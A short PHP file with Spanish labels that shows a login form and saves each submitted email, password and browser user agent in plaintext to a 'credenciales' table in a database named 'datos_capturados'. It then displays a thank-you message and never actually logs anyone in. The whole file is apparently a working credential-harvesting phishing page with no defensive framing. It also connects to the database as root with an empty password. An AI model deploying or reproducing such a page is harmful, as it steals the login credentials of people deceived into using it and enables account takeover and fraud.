<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $correo = $_POST['correo'] ?? '';
    $password = $_POST['password'] ?? '';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Conexión a la BD
$conn = new mysqli("database", "root", "", "datos_capturados");
    if ($conn->connect_error) {
        die("Error DB: " . $conn->connect_error);
    }

    // Preparar y ejecutar query
    $stmt = $conn->prepare("INSERT INTO credenciales (correo, password, useragent) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $correo, $password, $userAgent);
    $stmt->execute();
    $stmt->close();
    $conn->close();

    echo "Gracias. Información enviada.";
} else {
?>
<form method="POST">
    <label>Correo:</label><br>
    <input type="text" name="correo"><br>
    <label>Contraseña:</label><br>
    <input type="password" name="password"><br>
    <input type="submit" value="Iniciar sesión">
</form>
<?php } ?>
